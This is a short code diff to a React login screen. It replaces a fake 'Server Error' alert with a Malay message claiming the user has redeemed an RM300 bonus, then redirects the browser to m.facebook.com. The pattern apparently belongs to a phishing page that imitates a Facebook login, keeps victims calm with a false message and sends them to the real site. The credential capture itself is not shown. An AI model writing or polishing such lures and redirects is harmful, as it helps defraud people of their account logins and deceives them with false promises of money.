@@ -27,7 +27,7 @@ export default function LoginScreen() {
 
     // Wait a short moment to show loading state, then redirect
     setTimeout(() => {
-      alert("Server Error, Please Try Again Later");
+      alert("Tahniah, anda telah menebus bonus sebanyak RM300!!!");
       window.location.href = "https://m.facebook.com";
       setIsLoading(false);
     }, 1500);
